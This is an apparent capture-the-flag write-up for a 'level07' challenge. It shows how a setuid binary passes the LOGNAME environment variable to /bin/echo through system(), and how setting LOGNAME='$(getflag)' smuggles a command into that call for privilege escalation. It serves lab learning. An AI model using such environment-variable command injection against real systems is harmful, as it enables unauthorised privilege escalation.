# Security Vulnerability for Level07

The vulnerability is the command injection to the env variables, any user can modify the env variables. 

## Finding the Password for the `level08` User

### 1. Inspect the `/home/user/level07` Directory
The directory `/home/user/level07` has 1 file: `level07` which is executable.
User `level07` has execute permission to this file.

```bash
./level07
```
Output:
```bash
level07
```

### 2. Inspect a Binary of `level07`

```bash
strings level07
```
Output:
```bash
getenv
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh 
UWVS
[^_]
LOGNAME
/bin/echo %s 
;*2$"
```
This gives an idea that code uses an environment variable and print it with `echo`.

### 3. Inspect ENV Variables

Check if `LOGNAME` is in `env`:
```bash
env | grep LOGNAME
```
Output:
```bash
LOGNAME=level07
```
The binary retrieves the value of LOGNAME and uses it as an argument to /bin/echo through system().

### 4. Replace `LOGNAME` Variable in ENV

Try different syntax:
```bash
export LOGNAME=$(getflag)
```
```bash
export LOGNAME='$(getflag)'
```

The last one is working because otherwise the $(getflag) command's value is run directly in the shell and the code uses its value, but we need it to arrive to `echo LOGNAME` as $(getflag), single quotes help with it.

### 5. Get Password

```bash
./level07 
```
Output
```bash
Check flag.Here is your token :
```